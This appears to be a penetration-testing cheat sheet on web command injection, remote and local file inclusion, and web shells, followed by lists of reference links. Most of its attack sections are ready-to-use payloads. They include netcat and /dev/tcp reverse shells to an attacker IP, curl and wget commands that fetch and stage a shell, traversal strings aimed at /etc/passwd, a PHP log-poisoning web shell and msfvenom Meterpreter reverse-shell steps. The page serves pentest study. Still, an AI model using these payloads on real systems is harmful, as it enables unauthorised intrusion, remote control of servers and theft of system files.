---
title: Injection, RFI, and LFI
category: Web Application
order: 4
---

> **Test for Command Injection**

Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
Test Visable: | <code> ; ls /ect/passwd or /ect/hosts <br>test`pwd` <br> test$(pwd) <br> test; pwd <br> test | pwd <br> test && pwd </code>
Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
Test Blind Sleep: | <code> address=127.0.0.1 && sleep 10 </code>

**Comix**
{% highlight bash %}
commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument"

python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
{% endhighlight %}

> **Exploit Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello

#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 

#Alternative without spaces
http://victim/file?arg=$(CMD=$'curl\x20http://[AttackerIP]/shell.php\x20--output\x20/tmp/Notshell.php';$CMD)
http://victim/file?arg=$({wget,http://[AttackerIP]:[AttackerPort]/t,-O,/tmp/t})
http://victim/file?arg=$({chmod,+x,/tmp/t})
{% endhighlight %}


> **PHP Code Injection**

{% highlight bash %}
#example string
'.sleep(hexdec(dechex(20))).'

#example request
/index.php?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin'.sleep(hexdec(dechex(20))).'
{% endhighlight %}

> **File Inclusion**

**Linux Test Strings:**

{% highlight bash %}
http://website/?p=file%3a%2f%2f%2fetc%2fpasswd

/ect/passwd

 ../../../../../../../../../../../../../../ect/passwd 
{% endhighlight %}

**Windows Test Strings:**

{% highlight bash %}
../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>

%WINDIR%\win.ini 

%SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
{% endhighlight %}

**Auto-Extension (.php) Bypass (PHP version < 5.3):**

* NULL "%00"

{% highlight bash %}
/index.php?system=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin
{% endhighlight %}

>**Shell from RFI and LFI**

**Test Tool - fimap**
{% highlight bash %}
fimap -u 'http://website/?p=file.html'
{% endhighlight %}

**Using ZAP to Fuzz the URL:**
1. Right click on request that looks injectable -> fuzz using
[JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)


**What to go after - Linux:**
* /etc/passwd
* [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)

**What to go after - Windows:**
* Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
* http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
* /global.asax
* \docume~1\fprefect\mydocu~1
* \windows\system32\cmd.exe
* [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)

**File Locations -Debian w/ Apache:**
* /var/www/html
* /home/username/public_html
* /use/lib/cgi-bin

**Grab PHP files and Binary Data**

{% highlight bash %}
curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=[resource]" | base64 -d
<br>
Examples:<br>
/etc/php/7.0/apache2/php.ini
index.php
{% endhighlight %}

**RFI Shell 1:**
1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
2. python -m SimpleHTTPServer 8080
3. Set up netcat listener (if needed based on webshell)
3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

**RFI Meterpreter Shell:**
1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
2. Wrap it: add <?php ?> to the payload
3.  Set up handler: 
* use exploit/multi/handler
* set payload php/meterpreter_reverse/tcp
* set lhost 192.168.1.8
* set lport 1234
exploit
4.  python -m SimpleHTTPServer 8080
5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

**LFI Shell:**

{% highlight bash %}
#From logs
nc -nv 192.168.1.2 80
<?php echo shell_exec($_GET['cmd']);?>
Navigate to http://192.168.1.2/cmd=ipconfig&LANG=../../../../../../../../xampp/apache/logs/access_log%00

#Look for file uploads and determin directory
#Attempt to upload a web shell
Navigate to that location using LFI.

{% endhighlight %}

* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)


> **Web Shells**

Kali: 

PHP | <code> /usr/share/webshells/php/ </code>
PERL | <code> /usr/share/webshells/perl/ </code>
Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
ASP | <code> /usr/share/webshells/asp/ </code>
ASPX | <code> /usr/share/webshells/aspx/ </code>
JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>

Online:

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **XXE**

* [SANS XXE](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities)
* [OWASP XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
* [OWASP XML Cheat Sheet](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet)
* [Youtube XXE](https://www.youtube.com/watch?v=DJaX4HN2gwQ)
* [Microsoft XML Entity](https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110).aspx)
* [w3schools XML DTD](https://www.w3schools.com/xml/xml_dtd.asp)

> **LDAP Injection**

* [SANS](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap)
* [OWASP](https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006))


> **PHP Autoload and Object Injection**
* [PHP Autoload](https://hakre.wordpress.com/2013/02/10/php-autoload-invalid-classname-injection/)
* [PHP Autoload](https://prezi.com/5hif_vurb56p/php-object-injection-revisited/)

> **Useful Resources**

* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [websec](https://websec.ca/kb/sql_injection)
* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
* [LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
* [CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)

> **Useful Tools**

* [SQLMap](http://sqlmap.org)
* [Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)

